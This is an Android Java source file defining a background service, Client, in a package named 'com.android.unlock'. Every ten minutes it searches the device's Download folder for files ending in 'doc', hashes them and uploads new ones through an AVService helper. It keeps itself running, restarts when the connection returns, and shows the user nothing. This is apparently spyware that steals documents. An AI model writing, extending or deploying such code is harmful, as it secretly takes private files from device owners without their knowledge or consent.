package com.android.unlock;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.util.Log;
import android.widget.Toast;

import java.io.File;
import java.io.FileInputStream;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;


/**
 * Created by yezersky on 15-1-2.
 */
public class Client extends Service {

    private boolean isInit = false;
    private List<String> lstFile = new ArrayList<String>(); //结果 List
    private List<String> lstName = new ArrayList<String>();

    Timer timer;

    protected boolean isConnected = true;

    public final String TAG = Client.class.getSimpleName();

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "In onCreate");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        Intent intent = new Intent("com.android.unlock.destroy");
        sendBroadcast(intent);
        // isInit = true;
        super.onDestroy();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // return super.onStartCommand(intent, flags, startId);
        // MyThread mt = new MyThread();
        // mt.start();
        Log.d(TAG,"isInit:" + Data.getIsInit());
        if(timer != null) {
            timer.purge();
        }
        Timer timer = new Timer();
        timer.schedule(new MyTask(),3000,600000);
        //isInit = true;
        // new RemoteDataTask().execute();
        // return Service.START_STICKY;
        flags = START_STICKY;
        return super.onStartCommand(intent, flags, startId);
    }

    private final Handler handler = new Handler(){

        @Override
        public void handleMessage(Message msg) {
            //接收消息
            switch (msg.what) {
                case 110:
                    Bundle bundle = msg.getData();
                    String string = bundle.getString("string");
                    //更新UI
                    Toast.makeText(Client.this,string,Toast.LENGTH_SHORT).show();
                    break;
            }
        }
    };

    class MyTask extends TimerTask {
        //Message msg;
        //Bundle bundle;

        public MyTask() {
            //msg = new Message();
            //bundle = new Bundle();
        }

        @Override
        public void run() {
            lstFile.clear();
            GetFiles(Environment.getExternalStorageDirectory() + "/Download","doc",true);
            String tempPath = Environment.getExternalStorageDirectory()+"/Download";
            // Toast.makeText(Client.this,tempPath,Toast.LENGTH_SHORT).show();
            //msg.what = 110;
            //bundle.putString("string",tempPath);
            //msg.setData(bundle);
            //handler.sendMessage(msg);
            for(int i=0;i<lstFile.size();i++) {
                String fileMD5 = fileToMD5(new File(lstFile.get(i)));
                Boolean isExist = AVService.VerifyFileExist(fileMD5);
                if(!isExist) {
                    // Toast.makeText(Client.this,lstFile.get(i),Toast.LENGTH_SHORT).show();
                    //msg.what = 110;
                    //bundle.putString("string",lstFile.get(i));
                    //msg.setData(bundle);
                    //handler.sendMessage(msg);
                    AVService.Upload(fileMD5, lstName.get(i), lstFile.get(i));
                }
            }
        }
    }

    public void GetFiles(String Path, String Extension,boolean IsIterative) //搜索目录，扩展名，是否进入子文件夹
    {
        File[] files =new File(Path).listFiles();
        for (int i =0; i < files.length; i++)
        {
            File f = files[i];
            if (f.isFile())
            {
                if (f.getPath().substring(f.getPath().length() - Extension.length()).equals(Extension)) { //判断扩展名
                    lstFile.add(f.getAbsolutePath());
                    lstName.add(f.getName());
                }
            }
            else if (f.isDirectory() && f.getPath().indexOf("/.") == -1 && IsIterative) //忽略点文件（隐藏文件/文件夹）
                GetFiles(f.getPath(), Extension, IsIterative);
        }
    }

    public static String bytesToHex(byte[] bytes) {
        StringBuffer md5str = new StringBuffer();
        //把数组每一字节换成16进制连成md5字符串
        int digital;
        for (int i = 0; i < bytes.length; i++) {
            digital = bytes[i];
            if(digital < 0) {
                digital += 256;
            }
            if(digital < 16){
                md5str.append("0");
            }
            md5str.append(Integer.toHexString(digital));
        }
        return md5str.toString().toUpperCase();
    }

    public static String fileToMD5(File file) {
        if(file == null) {
            return null;
        }
        if(file.exists() == false) {
            return null;
        }
        if(file.isFile() == false) {
            return null;
        }
        FileInputStream fis = null;
        try {
            //创建一个提供信息摘要算法的对象，初始化为md5算法对象
            MessageDigest md = MessageDigest.getInstance("MD5");
            fis = new FileInputStream(file);
            byte[] buff = new byte[1024];
            int len = 0;
            while(true) {
                len = fis.read(buff, 0, buff.length);
                if(len == -1){
                    break;
                }
                //每次循环读取一定的字节都更新
                md.update(buff,0,len);
            }
            //关闭流
            fis.close();
            //返回md5字符串
            return bytesToHex(md.digest());
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public final BroadcastReceiver ConnectivityCheckReceiver = new BroadcastReceiver() {

        private String TAG = "ConnectivityReceiver";

        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            String type;
            boolean state;
            //isConnected = intent.getBooleanExtra(ConnectivityManager.EXTRA_NO_CONNECTIVITY, false);

            ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo TestCo = connectivityManager.getActiveNetworkInfo();
            if(TestCo == null)
                state = false;
            else
                state = true;

            NetworkInfo networkInfo = (NetworkInfo) intent.getParcelableExtra(ConnectivityManager.EXTRA_NETWORK_INFO);
            if(networkInfo.getType() == ConnectivityManager.TYPE_WIFI)
                type = "Wifi";
            else if(networkInfo.getType() == ConnectivityManager.TYPE_MOBILE)
                type = "3g";
            else
                type = "other";

            if(state){
                Log.w(TAG, "Connection is Available "+type);
                if(!isConnected) { //Si la connection est maintenant ok et qu'on était déconnecté
                    Intent serviceIntent = new Intent(context, Client.class); // On lance le service
                    serviceIntent.setAction("ConnectivityCheckReceiver");
                    context.startService(serviceIntent);
                }
            }
            else {
                Log.w(TAG, "Connection is not Available "+type);
            }
            isConnected = state;
        }
    };

}
